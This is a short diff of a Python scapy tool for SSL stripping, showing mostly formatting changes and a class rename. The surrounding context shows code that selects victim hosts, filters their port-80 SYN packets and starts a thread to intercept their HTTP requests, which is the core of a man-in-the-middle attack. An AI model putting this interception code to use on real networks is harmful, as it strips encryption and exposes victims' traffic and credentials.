@@ -3,14 +3,15 @@ from scapy.layers.inet import IP
 from scapy.layers.inet import TCP
 import threading
 import time
-import requests
+#import requests
 import netifaces
 from math import log
 
 
-class sslstrip():
+class sslstrip1():
 
-def getsslVictims(self):
+
+	def getsslVictims(self):
 		# self.sslVictims = [{ "IP": "10.0.2.4", "MAC": self.get_mac("10.0.2.4")}]
 		# return
 
@@ -27,7 +28,6 @@ def getsslVictims(self):
 		if(choice == "Y" or choice == "y"):
 			self.ssl_strip = True
 			self.getsslVictims()
-
 			sll_thread = threading.Thread(target=self.sslstrip)
 			sll_thread.setDaemon(True)
 			sll_thread.start()
@@ -36,6 +36,7 @@ def getsslVictims(self):
 		return TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.sslVictims])
 
 	def sslstrip(self):
+		
 		print("Starting ssl stripping...")
 		def sendRequest(pkt):
 			if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
